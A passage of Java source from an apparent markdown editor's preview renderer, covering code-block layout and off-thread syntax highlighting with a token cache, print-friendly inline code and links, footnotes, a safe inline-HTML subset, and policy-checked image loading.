     * <p>The preview's block is a single node — a wrapping {@code Label}, or one {@code TextFlow} holding
     * the whole listing — and neither survives a page boundary. The label is measured inside a page-high
     * scene, so a 150-line block reported one page of height, was never recognised as over-tall and printed
     * its first 30 lines followed by "...". The flow was recognised, but the paginator could only cut it at
     * its runs or at a space: mid-line, and the rebuilt pieces lost the block's font and colours.
     *
     * <p>One node per line gives the paginator the only cut that is right for code — between lines — and
     * makes the block's height the sum of its lines, so a long listing is split by arithmetic rather than by
     * repeated layout. {@code runs} are the fence's tokens ({@link #tokenizeRuns}), or null to print plain.
     */
    static Node printCodeBlock(String code, List<Run> runs) {
        VBox box = new VBox();
        box.getStyleClass().addAll("md-code-block", "md-code-lines");
        box.setMaxWidth(Double.MAX_VALUE);
        for (List<Run> line : codeLines(runs == null ? List.of(new Run(code, List.of())) : runs)) {
            TextFlow flow = new TextFlow();
            for (Run run : line) {
                Text t = new Text(run.text());
                t.getStyleClass().add("text"); // token rules are `.text.<class>`; plain runs get the fallback
                t.getStyleClass().addAll(run.classes());
                flow.getChildren().add(t);
            }
            box.getChildren().add(flow);
        }
        return box;
    }

    /**
     * Regroups tokenised {@code runs} by source line, splitting any run that spans a line break. An empty
     * line keeps a single space so it still has a line's height when laid out. Pure; unit-tested.
     */
    static List<List<Run>> codeLines(List<Run> runs) {
        List<List<Run>> lines = new ArrayList<>();
        List<Run> cur = new ArrayList<>();
        for (Run run : runs) {
            String text = run.text();
            int from = 0;
            for (int nl = text.indexOf('\n'); nl >= 0; nl = text.indexOf('\n', from)) {
                addRun(cur, text, from, nl, run.classes());
                lines.add(closeLine(cur));
                cur = new ArrayList<>();
                from = nl + 1;
            }
            addRun(cur, text, from, text.length(), run.classes());
        }
        lines.add(closeLine(cur));
        return lines;
    }

    private static void addRun(List<Run> line, String text, int from, int to, List<String> classes) {
        int end = to > from && text.charAt(to - 1) == '\r' ? to - 1 : to; // CRLF: the CR is not content
        if (end > from) {
            line.add(new Run(text.substring(from, end), classes));
        }
    }

    private static List<Run> closeLine(List<Run> line) {
        return line.isEmpty() ? List.of(new Run(" ", List.of())) : line;
    }

    private static Node codeBlock(String literal) {
        String code = stripTrailingNewline(literal);
        Label label = new Label(code);
        label.getStyleClass().add("md-code-block");
        label.setMaxWidth(Double.MAX_VALUE);
        return sideScrollingCode(label, code);
    }

    /** Node property holding a code block's text, for the preview menu's "Copy Code Block". */
    static final String CODE_KEY = "editora.md.code";
    /** Node property holding a link's destination, for the preview menu's "Copy Link Address". */
    static final String LINK_KEY = "editora.md.link";

    /**
     * A code block on screen keeps its lines: it is as wide as its longest line and scrolls sideways in a
     * narrower column ({@link SideScroll}) rather than wrapping, which misstates a diff, a log or Python.
     */
    private static Node sideScrollingCode(javafx.scene.layout.Region block, String code) {
        block.setMinWidth(javafx.scene.layout.Region.USE_PREF_SIZE);
        SideScroll scroll = new SideScroll(block);
        scroll.getProperties().put(CODE_KEY, code);
        return scroll;
    }

    /** Above this many characters a fenced block renders as plain text (avoids tokenizing a huge block). */
    static final int MAX_HIGHLIGHT_CHARS = 50_000;

    /** One tokenized run: its text + the token style classes ({@code .text.<class>}) to apply. */
    record Run(String text, List<String> classes) {}

    /** Off-FX daemon worker for code-block tokenization (tm4e access must not run on the FX thread). */
    private static final ExecutorService CODE_HIGHLIGHT_POOL = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "md-code-highlight");
        t.setDaemon(true);
        return t;
    });

    /**
     * A fenced code block, syntax-highlighted with the TextMate grammar for its info string (`{@code ```java}`)
     * when one is bundled. The code shows immediately as plain text; tokenizing runs <strong>off the FX
     * thread</strong> (tm4e access must not happen on the FX thread — it would contend/deadlock with the
     * editor's background highlighters and blocks the UI) and the styled {@code Text} runs (carrying the same
     * {@code .text.<class>} classes the editor uses, so it tracks the active theme) are filled in on the FX
     * thread when ready — mirroring {@code MermaidImages}' placeholder-then-fill. Falls back to the plain
     * {@link #codeBlock} when the language is unknown/absent or the block is huge.
     */
    private static Node highlightedCodeBlock(String literal, String info) {
        String code = stripTrailingNewline(literal);
        IGrammar grammar = code.isEmpty() || code.length() > MAX_HIGHLIGHT_CHARS ? null : grammarForInfo(info);
        if (grammar == null) {
            return codeBlock(literal);
        }
        TextFlow flow = new TextFlow();
        flow.getStyleClass().add("md-code-block");
        flow.setMaxWidth(Double.MAX_VALUE);
        String cacheKey = grammar.getScopeName() + '\u0000' + code;
        List<Run> known = TOKEN_CACHE.get(cacheKey);
        if (known != null) {
            flow.getChildren().setAll(tokenNodes(known)); // seen before: coloured at once, no flash of plain text
            return sideScrollingCode(flow, code);
        }
        Text initial = new Text(code);
        initial.getStyleClass().add("text");
        flow.getChildren().add(initial);
        CODE_HIGHLIGHT_POOL.execute(() -> {
            List<Run> runs = tokenizeRuns(code, grammar);
            if (runs == null) {
                return; // tokenize failed — leave the plain text
            }
            TOKEN_CACHE.put(cacheKey, runs);
            Platform.runLater(() -> flow.getChildren().setAll(tokenNodes(runs)));
        });
        return sideScrollingCode(flow, code);
    }

    private static List<Text> tokenNodes(List<Run> runs) {
        List<Text> nodes = new ArrayList<>(runs.size());
        for (Run run : runs) {
            Text t = new Text(run.text());
            t.getStyleClass().add("text"); // token rules are `.text.<class>`; plain runs get the fallback
            t.getStyleClass().addAll(run.classes());
            nodes.add(t);
        }
        return nodes;
    }

    /** Most characters of code whose tokens are remembered (keys hold the code, so this bounds the memory). */
    static final int TOKEN_CACHE_CHARS = 2_000_000;

    /**
     * Tokens of fences already highlighted, by grammar scope and code. A re-render used to tokenise every
     * fence of the document again and show each one uncoloured in the meantime; an unchanged fence is now
     * coloured the moment it is built. Least recently used entries go once the cached code passes
     * {@link #TOKEN_CACHE_CHARS}.
     */
    static final TokenCache TOKEN_CACHE = new TokenCache(TOKEN_CACHE_CHARS);

    /** A character-bounded LRU of token runs. Thread-safe: filled on the highlight worker, read on FX. */
    static final class TokenCache {
        private final int maxChars;
        private final java.util.LinkedHashMap<String, List<Run>> map = new java.util.LinkedHashMap<>(64, 0.75f, true);
        private long chars;

        TokenCache(int maxChars) {
            this.maxChars = maxChars;
        }

        synchronized List<Run> get(String key) {
            return map.get(key);
        }

        synchronized void put(String key, List<Run> runs) {
            if (key.length() > maxChars) {
                return;
            }
            if (map.put(key, runs) == null) {
                chars += key.length();
            }
            var it = map.entrySet().iterator();
            while (chars > maxChars && it.hasNext()) {
                chars -= it.next().getKey().length();
                it.remove();
            }
        }

        synchronized int size() {
            return map.size();
        }
    }

    /** Off-thread: tokenizes {@code code} into styled runs, or {@code null} on failure. */
    static List<Run> tokenizeRuns(String code, IGrammar grammar) {
        try {
            StyleSpans<Collection<String>> spans = TextMateHighlighter.compute(code, grammar);
            List<Run> runs = new ArrayList<>();
            int pos = 0;
            for (StyleSpan<Collection<String>> span : spans) {
                int end = Math.min(code.length(), pos + span.getLength());
                if (end <= pos) {
                    continue;
                }
                runs.add(new Run(code.substring(pos, end), List.copyOf(span.getStyle())));
                pos = end;
            }
            if (pos < code.length()) {
                runs.add(new Run(code.substring(pos), List.of()));
            }
            return runs;
        } catch (RuntimeException e) {
            return null;
        }
    }

    /** Common fence info-string aliases → a file extension the {@link GrammarRegistry} recognizes. */
    private static final Map<String, String> INFO_EXT = Map.ofEntries(
            Map.entry("javascript", "js"),
            Map.entry("js", "js"),
            Map.entry("node", "js"),
            Map.entry("typescript", "ts"),
            Map.entry("ts", "ts"),
            Map.entry("jsx", "jsx"),
            Map.entry("tsx", "tsx"),
            Map.entry("python", "py"),
            Map.entry("py", "py"),
            Map.entry("ruby", "rb"),
            Map.entry("rb", "rb"),
            Map.entry("rust", "rs"),
            Map.entry("rs", "rs"),
            Map.entry("golang", "go"),
            Map.entry("go", "go"),
            Map.entry("bash", "sh"),
            Map.entry("shell", "sh"),
            Map.entry("sh", "sh"),
            Map.entry("zsh", "sh"),
            Map.entry("cpp", "cpp"),
            Map.entry("c++", "cpp"),
            Map.entry("csharp", "cs"),
            Map.entry("cs", "cs"),
            Map.entry("c#", "cs"),
            Map.entry("kotlin", "kt"),
            Map.entry("kt", "kt"),
            Map.entry("yml", "yaml"),
            Map.entry("yaml", "yaml"),
            Map.entry("markdown", "md"),
            Map.entry("md", "md"));

    /** The bundled grammar for a fence info string (first token, case-insensitive), or {@code null}. */
    public static IGrammar grammarForInfo(String info) {
        if (info == null || info.isBlank()) {
            return null;
        }
        String lang = info.trim().split("\\s+")[0].toLowerCase(Locale.ROOT);
        GrammarRegistry reg = GrammarRegistry.shared();
        IGrammar g = reg.forLanguageName(lang); // full language names: java, python, shell, typescript, …
        if (g == null) {
            g = reg.forFileName("x." + INFO_EXT.getOrDefault(lang, lang)); // extension-style: js, py, sh, …
        }
        return g;
    }

    /** YAML front matter rendered as a muted key/value metadata block at the top of the document. */
    private static Node frontMatterBlock(YamlFrontMatterBlock fm) {
        VBox box = new VBox();
        box.getStyleClass().add("md-frontmatter");
        for (org.commonmark.node.Node n = fm.getFirstChild(); n != null; n = n.getNext()) {
            if (n instanceof YamlFrontMatterNode meta) {
                Label row = new Label(meta.getKey() + ": " + String.join(", ", meta.getValues()));
                row.getStyleClass().add("md-frontmatter-row");
                row.setWrapText(true);
                box.getChildren().add(row);
            }
        }
        return box.getChildren().isEmpty() ? null : box;
    }

    /** A footnote definition: its label marker followed by the definition's block content. */
    private static Node footnoteDefinition(FootnoteDefinition def, RenderContext ctx) {
        HBox row = new HBox();
        row.getStyleClass().add("md-footnote-def");
        Label marker = new Label("[" + def.getLabel() + "]");
        marker.getStyleClass().add("md-footnote-def-marker");
        VBox content = new VBox();
        content.getStyleClass().add("md-footnote-def-content");
        HBox.setHgrow(content, Priority.ALWAYS);
        appendBlocks(def, content, ctx);
        row.getChildren().addAll(marker, content);
        return row;
    }

    /** An inline footnote reference, rendered as a small raised {@code [label]} marker. */
    private static Text footnoteRef(String label) {
        Text t = new Text("[" + (label == null ? "" : label) + "]");
        t.getStyleClass().addAll("md-text", "md-footnote-ref");
        return t;
    }

    /** Whether a fenced block's info string marks it as Mermaid (first token, case-insensitive). */
    static boolean isMermaidInfo(String info) {
        if (info == null) {
            return false;
        }
        String first = info.strip().split("\\s+", 2)[0];
        return first.equalsIgnoreCase("mermaid");
    }

    // --- inline level --------------------------------------------------------------------------

    private static TextFlow inlineFlow(org.commonmark.node.Node block, RenderContext ctx) {
        TextFlow flow = new TextFlow();
        appendInline(block, flow, List.of(), ctx);
        return flow;
    }

    private static void appendInline(
            org.commonmark.node.Node parent, TextFlow flow, List<String> styles, RenderContext ctx) {
        InlineHtml html = null;
        for (org.commonmark.node.Node n = parent.getFirstChild(); n != null; n = n.getNext()) {
            if (n instanceof HtmlInline h) {
                if (html == null) {
                    html = new InlineHtml();
                }
                html.tag(MarkdownHtml.tag(h.getLiteral()), flow, ctx); // comments and unknown tags: dropped
            } else {
                emitInline(n, flow, html == null ? styles : html.styles(styles), ctx);
            }
        }
        if (html != null) {
            html.close(flow, ctx);
        }
    }

    /**
     * The inline HTML tags open at one point of a run of inline nodes. CommonMark hands {@code <kbd>Ctrl</kbd>}
     * over as three siblings — a tag, text, a tag — so the tags seen so far decide how the nodes after them
     * are styled. Only the safe subset means anything ({@link MarkdownHtml#styleOf}, {@code <br>},
     * {@code <img>}, {@code <a href>}); every other tag is dropped and its text kept.
     */
    private static final class InlineHtml {
        private final List<String> open = new ArrayList<>();
        private String href;
        private String title;
        private int linkFrom;

        List<String> styles(List<String> base) {
            if (open.isEmpty() && href == null) {
                return base;
            }
            List<String> out = new ArrayList<>(base);
            out.addAll(open);
            if (href != null) {
                out.add("md-link");
            }
            return out;
        }

        void tag(MarkdownHtml.Tag tag, TextFlow flow, RenderContext ctx) {
            if (tag == null) {
                return;
            }
            String style = MarkdownHtml.styleOf(tag.name());
            if (style != null) {
                if (tag.close()) {
                    int at = open.lastIndexOf(style);
                    if (at >= 0) {
                        open.remove(at);
                    }
                } else {
                    open.add(style);
                }
                return;
            }
            switch (tag.name()) {
                case "br" -> flow.getChildren().add(new Text("\n"));
                case "img" -> {
                    if (!tag.close()) {
                        flow.getChildren().add(htmlImage(tag, ctx));
                    }
                }
                case "a" -> {
                    close(flow, ctx);
                    if (!tag.close()
                            && tag.attr("href") != null
                            && !tag.attr("href").isBlank()) {
                        href = tag.attr("href");
                        title = tag.attr("title");
                        linkFrom = flow.getChildren().size();
                    }
                }
                default -> {}
            }
        }

        /** Ends an open {@code <a>}: wires the nodes added since it opened as one link. */
        void close(TextFlow flow, RenderContext ctx) {
            if (href != null) {
                wireLink(flow, Math.min(linkFrom, flow.getChildren().size()), href, title, ctx);
                href = null;
            }
        }
    }

    private static void emitInline(org.commonmark.node.Node n, TextFlow flow, List<String> styles, RenderContext ctx) {
        if (n instanceof org.commonmark.node.Text t) {
            emitText(t.getLiteral(), flow, styles, ctx);
        } else if (n instanceof MarkdownMath.Inline m) {
            flow.getChildren().add(ctx.inlineMath(m.getLatex()));
        } else if (n instanceof Code c) {
            addInlineCode(flow, c.getLiteral(), ctx);
        } else if (n instanceof Emphasis) {
            appendInline(n, flow, with(styles, "md-italic"), ctx);
        } else if (n instanceof StrongEmphasis) {
            appendInline(n, flow, with(styles, "md-bold"), ctx);
        } else if (n instanceof Strikethrough) {
            appendInline(n, flow, with(styles, "md-strike"), ctx);
        } else if (n instanceof Ins) {
            appendInline(n, flow, with(styles, "md-ins"), ctx);
        } else if (n instanceof FootnoteReference ref) {
            flow.getChildren().add(footnoteRef(ref.getLabel()));
        } else if (n instanceof InlineFootnote) {
            appendInline(n, flow, with(styles, "md-footnote-ref"), ctx);
        } else if (n instanceof Link link) {
            int from = flow.getChildren().size();
            appendInline(n, flow, with(styles, "md-link"), ctx);
            wireLink(flow, from, link.getDestination(), link.getTitle(), ctx);
            String target = ctx.print() ? printedLinkTarget(link.getDestination(), linkText(link)) : null;
            if (target != null) {
                // Paper cannot be clicked: say where the link goes. One run, so it wraps wherever it must.
                flow.getChildren().add(styledText(" (" + target + ")", List.of("md-link-url")));
            }
        } else if (n instanceof org.commonmark.node.Image img) {
            flow.getChildren().add(imageNode(img, ctx));
        } else if (n instanceof SoftLineBreak) {
            flow.getChildren().add(new Text(" "));
        } else if (n instanceof HardLineBreak) {
            flow.getChildren().add(new Text("\n"));
        } else if (n instanceof TaskListItemMarker) {
            // rendered as a CheckBox by renderList — skip here
        } else {
            appendInline(n, flow, styles, ctx); // unknown inline: descend
        }
    }

    /** Inline code as a {@code Label} so it can carry a GitHub-style rounded gray background (a
     *  {@link Text} can only fill its glyphs). Flows inline inside the surrounding {@link TextFlow}. */
    private static Label inlineCode(String literal) {
        Label code = new Label(literal);
        code.getStyleClass().add("md-inline-code");
        return code;
    }

    /** Inline code no longer than this prints as one pill; longer code is cut into pieces of at most this. */
    static final int CODE_CHUNK = 16;

    /**
     * Adds inline code to {@code flow}: one pill in the preview, and in print a row of pieces the line can
     * break between.
     *
     * <p>A {@code Label} inside a {@code TextFlow} is a single box — it cannot wrap — so a command or a path
     * longer than the line ran straight off the right edge of the paper. The preview scrolls and resizes;
     * a sheet does neither. The pieces are labels still, each carrying the pill's background, so on one line
     * they read as the same pill ({@code md-code-first/-mid/-last} square off the inner corners).
     */
    private static void addInlineCode(TextFlow flow, String literal, RenderContext ctx) {
        List<String> chunks = codeChunks(literal);
        if (chunks.size() < 2) {
            flow.getChildren().add(inlineCode(literal));
            return;
        }
        for (int i = 0; i < chunks.size(); i++) {
            if (i > 0) {
                // A break opportunity. Without one the row of labels is a single word to the line breaker,
                // which starts it on a line of its own before cutting it; a zero-width space is not taken
                // as one, so this is a real space set too small to see (.md-code-break).
                Text gap = new Text(" ");
                gap.getStyleClass().add("md-code-break");
                flow.getChildren().add(gap);
            }
            Label part = inlineCode(chunks.get(i));
            part.getStyleClass()
                    .add(i == 0 ? "md-code-first" : i == chunks.size() - 1 ? "md-code-last" : "md-code-mid");
            flow.getChildren().add(part);
        }
    }

    /**
     * Cuts inline code into pieces of at most {@link #CODE_CHUNK} characters for print, preferring to cut
     * after a space, then after punctuation a reader expects a break at ({@code / - . = ,} …), and only then
     * mid-word. Code that fits one piece comes back as that one piece. Pure; unit-tested.
     */
    static List<String> codeChunks(String literal) {
        if (literal == null || literal.length() <= CODE_CHUNK) {
            return List.of(literal == null ? "" : literal);
        }
        List<String> out = new ArrayList<>();
        int from = 0;
        while (literal.length() - from > CODE_CHUNK) {
            int cut = -1;
            int soft = -1;
            for (int i = from + 1; i <= from + CODE_CHUNK; i++) {
                char before = literal.charAt(i - 1);
                if (Character.isWhitespace(before) && !Character.isWhitespace(literal.charAt(i))) {
                    cut = i;
                } else if (i - from >= 4 && "/\\-_.,;:=&?+|)]}>".indexOf(before) >= 0) {
                    soft = i;
                }
            }
            int end = cut > 0 ? cut : soft > 0 ? soft : from + CODE_CHUNK;
            if (Character.isLowSurrogate(literal.charAt(end)) && Character.isHighSurrogate(literal.charAt(end - 1))) {
                end--; // never between the two halves of one character
            }
            out.add(literal.substring(from, end));
            from = end;
        }
        out.add(literal.substring(from));
        return out;
    }

    /** The plain text a link shows: its text and inline-code children, images left out. */
    private static String linkText(org.commonmark.node.Node node) {
        StringBuilder sb = new StringBuilder();
        for (org.commonmark.node.Node c = node.getFirstChild(); c != null; c = c.getNext()) {
            if (c instanceof org.commonmark.node.Text t) {
                sb.append(t.getLiteral());
            } else if (c instanceof Code code) {
                sb.append(code.getLiteral());
            } else if (!(c instanceof org.commonmark.node.Image)) {
                sb.append(linkText(c));
            }
        }
        return sb.toString();
    }

    /**
     * What a printed link shows in parentheses after its text so the destination survives on paper, or null
     * when nothing should be added: the link stays inside the document ({@code #anchor}) or is a relative
     * file, its text already is the address (an autolink, or {@code [example.org](https://example.org/)}),
     * or it has no text at all (a linked badge image). {@code mailto:} is shown as the bare address.
     * Pure; unit-tested.
     */
    static String printedLinkTarget(String destination, String text) {
        if (destination == null || text == null || text.isBlank()) {
            return null;
        }
        String dest = destination.strip();
        String lower = dest.toLowerCase(java.util.Locale.ROOT);
        String shown;
        if (lower.startsWith("mailto:")) {
            shown = dest.substring("mailto:".length());
        } else if (lower.startsWith("http://") || lower.startsWith("https://")) {
            shown = dest;
        } else {
            return null;
        }
        return shown.isBlank() || bareAddress(shown).equalsIgnoreCase(bareAddress(text)) ? null : shown;
    }

    /** An address without its scheme and trailing slash, for telling "the text is the URL" apart. */
    private static String bareAddress(String s) {
        String t = s.strip().replaceFirst("(?i)^(https?://|mailto:)", "");
        return t.endsWith("/") ? t.substring(0, t.length() - 1) : t;
    }

    /**
     * Adds a run of text. Inside {@code <kbd>} it is a key cap, inside {@code <code>}/{@code <samp>} an inline
     * code pill ({@link InlineHtml}); otherwise plain styled text.
     */
    private static void emitText(String literal, TextFlow flow, List<String> styles, RenderContext ctx) {
        if (literal.isEmpty()) {
            return;
        }
        if (styles.contains("md-kbd")) {
            Label key = inlineCode(literal);
            key.getStyleClass().add("md-kbd");
            flow.getChildren().add(key);
        } else if (styles.contains("md-html-code")) {
            addInlineCode(flow, literal, ctx);
        } else {
            flow.getChildren().add(styledText(literal, styles));
        }
    }

    private static Text styledText(String s, List<String> styles) {
        Text t = new Text(s);
        t.getStyleClass().add("md-text");
        t.getStyleClass().addAll(styles);
        return t;
    }

    /**
     * Makes the nodes of {@code flow} from {@code from} on one link to {@code dest}: a tooltip (the link's
     * title, then where it goes), and — when the surface follows links — a hand cursor, a primary-button
     * click, and keyboard focus with Enter/Space, named as a hyperlink for assistive technology. The
     * destination is also left on each node ({@link #LINK_KEY}) for "Copy Link Address".
     */
    private static void wireLink(TextFlow flow, int from, String dest, String title, RenderContext ctx) {
        if (dest == null || dest.isBlank()) {
            return;
        }
        Tooltip tip = new Tooltip(linkTooltip(title, dest));
        java.util.function.Consumer<String> onLinkClick = ctx.onLinkClick();
        boolean first = true;
        for (int i = from; i < flow.getChildren().size(); i++) {
            Node child = flow.getChildren().get(i);
            Tooltip.install(child, tip);
            child.getProperties().put(LINK_KEY, dest);
            if (onLinkClick == null) {
                continue; // print / popups: shown as a link, not followed
            }
            child.setCursor(javafx.scene.Cursor.HAND);
            child.setOnMouseClicked(e -> {
                if (followsLink(e.getButton(), e.isStillSincePress())) {
                    onLinkClick.accept(dest);
                }
            });
            if (first) {
                // One Tab stop per link, on its first run.
                child.setFocusTraversable(true);
                child.setAccessibleRole(javafx.scene.AccessibleRole.HYPERLINK);
                child.setAccessibleText(linkTooltip(title, dest));
                child.setOnKeyPressed(e -> {
                    if (e.getCode() == javafx.scene.input.KeyCode.ENTER
                            || e.getCode() == javafx.scene.input.KeyCode.SPACE) {
                        onLinkClick.accept(dest);
                        e.consume();
                    }
                });
                first = false;
            }
        }
    }

    /** The value of property {@code key} on {@code from} or its nearest ancestor that has one, else null —
     *  what the pointer is on ({@link #LINK_KEY}, {@link #CODE_KEY}) when the preview menu opens. */
    static String property(Node from, String key) {
        for (Node n = from; n != null; n = n.getParent()) {
            if (n.hasProperties() && n.getProperties().get(key) instanceof String value) {
                return value;
            }
        }
        return null;
    }

    /** Puts {@code text} on the system clipboard as plain text (nothing when null). FX thread. */
    static void copyToClipboard(String text) {
        if (text != null) {
            javafx.scene.input.ClipboardContent content = new javafx.scene.input.ClipboardContent();
            content.putString(text);
            javafx.scene.input.Clipboard.getSystemClipboard().setContent(content);
        }
    }

    /** A link is followed by a plain primary click only: not by the secondary button (that opens the menu,
     *  it must not also open the browser) and not by the release that ends a drag. Pure. */
    static boolean followsLink(javafx.scene.input.MouseButton button, boolean stillSincePress) {
        return button == javafx.scene.input.MouseButton.PRIMARY && stillSincePress;
    }

    /** A link's tooltip: its title when it has one, then its destination. Pure. */
    static String linkTooltip(String title, String dest) {
        return title == null || title.isBlank() ? dest : title.strip() + "\n" + dest;
    }

    private static Node imageNode(org.commonmark.node.Image img, RenderContext ctx) {
        return imageNode(img.getDestination(), imageAlt(img), img.getTitle(), -1, ctx);
    }

    /** An {@code <img src alt title width>} of the HTML subset: the same loader and {@link ImagePolicy}. */
    private static Node htmlImage(MarkdownHtml.Tag tag, RenderContext ctx) {
        return imageNode(
                tag.attr("src"),
                tag.attr("alt") == null ? "" : tag.attr("alt"),
                tag.attr("title"),
                MarkdownHtml.pixels(tag.attr("width")),
                ctx);
    }

    /**
     * An image at {@code dest}, {@code width} px wide when the author said so (HTML {@code width}), else at its
     * own size up to the column. One that cannot be shown — blocked by the policy, missing, unreachable, not
     * an image — is replaced by a placeholder naming its alt text, so a wrong path is visible as such.
     */
    private static Node imageNode(String dest, String alt, String title, double width, RenderContext ctx) {
        String url = resolveUrl(dest, ctx.baseDir());
        if (url == null) {
            return inlineCode(imagePlaceholder(alt, null));
        }
        if (!ctx.images().allows(url)) {
            return inlineCode(imagePlaceholder(alt, dest)); // shown, never fetched
        }
        ImageView view = new ImageView();
        view.getStyleClass().add("md-image");
        view.setPreserveRatio(true);
        double max = width > 0 ? Math.min(width, MAX_IMAGE_WIDTH) : MAX_IMAGE_WIDTH;
        if (ctx.assets() != null) {
            // Print: the image was loaded beforehand, so its size is final when the page is measured. One
            // that did not load prints as its alt text — on paper an empty slot says nothing at all.
            PreviewImageLoader.Loaded loaded = ctx.assets().image(url);
            if (loaded == null) {
                return inlineCode(imagePlaceholder(alt, null));
            }
            view.setImage(loaded.image());
            view.setFitWidth(width > 0 ? max : Math.min(loaded.logicalWidth(), max));
            return view;
        }
        // Loads off the FX thread and rasterizes SVG (e.g. badges) that JavaFX's own decoder can't read;
        // sizes the view to the image's logical width, capped to the pane.
        StackPane slot = new StackPane(view);
        slot.getStyleClass().add("md-image-slot");
        slot.setAlignment(Pos.BOTTOM_LEFT);
        slot.setMaxSize(javafx.scene.layout.Region.USE_PREF_SIZE, javafx.scene.layout.Region.USE_PREF_SIZE);
        PreviewImageLoader.loadInto(view, url, max, width > 0, () -> {
            Label missing = inlineCode(imagePlaceholder(alt, null));
            missing.getStyleClass().add("md-image-missing");
            Tooltip.install(missing, new Tooltip(dest));
            slot.getChildren().setAll(missing);
        });
        String tip = title != null && !title.isBlank() ? title : alt;
        if (tip != null && !tip.isBlank()) {
            Tooltip.install(view, new Tooltip(tip));
            view.setAccessibleText(tip);
        }
        return slot;
    }

    /** Longest URL tail shown in a blocked-image placeholder (a query string can be kilobytes). */
    private static final int PLACEHOLDER_URL_MAX = 96;

    /** The text shown in place of an image that is not loaded: {@code [image: alt]}, followed by the URL when
     *  the image was <em>blocked</em> by the {@link ImagePolicy} (so the reader sees what was asked for). Pure. */
    static String imagePlaceholder(String alt, String blockedUrl) {
        String label = alt == null || alt.isBlank()
                ? Messages.tr("markdown.preview.image")
                : Messages.tr("markdown.preview.imageAlt", alt.strip());
        if (blockedUrl == null || blockedUrl.isBlank()) {
            return label;
        }
        String url = blockedUrl.strip();
        return label + " " + (url.length() > PLACEHOLDER_URL_MAX ? url.substring(0, PLACEHOLDER_URL_MAX) + "…" : url);
    }

    /** The alt text of an image: all the text inside its brackets, whatever inline markup wraps it. */
    private static String imageAlt(org.commonmark.node.Image img) {
        return linkText(img);
    }

    /**
     * The URL an image destination is loaded from: an {@code http(s)}/{@code file}/{@code data} URL as it is,
     * anything else as a path beside the document. A path is written for the web, so its {@code %20} escapes
     * are decoded and a {@code ?query} or {@code #fragment} dropped ({@code img/a.png?raw=true}); one that
     * starts with {@code /} and names nothing from the filesystem root is looked up from the folders above
     * the document, nearest first — the repository-root convention of a README. Null when there is nothing to
     * resolve against.
     */
    static String resolveUrl(String dest, Path baseDir) {
        if (dest == null || dest.isBlank()) {
            return null;
        }
        if (dest.matches("(?i)^(https?|file|data):.*")) {
            return dest;
        }
        if (baseDir == null) {
            return null;
        }
        try {
            String path = localPath(dest);
            if (path.isEmpty()) {
                return null;
            }
            Path target = baseDir.resolve(path).normalize();
            if (path.startsWith("/")
                    && baseDir.getFileSystem() == java.nio.file.FileSystems.getDefault()
                    && !java.nio.file.Files.exists(target)) {
                String rel = path.replaceFirst("^/+", "");
                for (Path dir = baseDir.toAbsolutePath(); dir != null && !rel.isEmpty(); dir = dir.getParent()) {
                    Path candidate = dir.resolve(rel).normalize();
                    if (java.nio.file.Files.isRegularFile(candidate)) {
                        target = candidate;
                        break;
                    }
                }
            }
            return target.toUri().toString();
        } catch (RuntimeException e) {
            return null;
        }
    }

    /** A relative image destination as a filesystem path: query and fragment cut, {@code %XX} decoded as
     *  UTF-8 (a malformed escape, and a {@code +}, are kept as written). Pure. */
    static String localPath(String dest) {
        String s = dest.strip();
        int cut = -1;
        for (int i = 0; i < s.length(); i++) {
            if (s.charAt(i) == '?' || s.charAt(i) == '#') {
                cut = i;
                break;
            }
        }
        if (cut >= 0) {
            s = s.substring(0, cut);
        }
        if (s.indexOf('%') < 0) {
            return s;
        }
        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream(s.length());
        byte[] bytes = s.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        for (int i = 0; i < bytes.length; i++) {
            int hi = i + 2 < bytes.length ? Character.digit(bytes[i + 1], 16) : -1;
            int lo = i + 2 < bytes.length ? Character.digit(bytes[i + 2], 16) : -1;
            if (bytes[i] == '%' && hi >= 0 && lo >= 0) {
                out.write(hi * 16 + lo);
                i += 2;
            } else {
                out.write(bytes[i]);
            }
        }
        return out.toString(java.nio.charset.StandardCharsets.UTF_8);
    }

    private static TaskListItemMarker firstTaskMarker(org.commonmark.node.Node listItem) {
        // commonmark-java inserts the marker as the list item's first child (a sibling of the paragraph).
        if (listItem.getFirstChild() instanceof TaskListItemMarker m) {
            return m;
        }
        return null;
    }

    private static List<String> with(List<String> base, String extra) {
        List<String> out = new ArrayList<>(base);
        out.add(extra);
        return out;
    }

    static String stripTrailingNewline(String s) {
        if (s == null) {
            return "";
        }
        int end = s.length();
        while (end > 0 && (s.charAt(end - 1) == '\n' || s.charAt(end - 1) == '\r')) {
            end--;
        }
        return s.substring(0, end);
    }
}
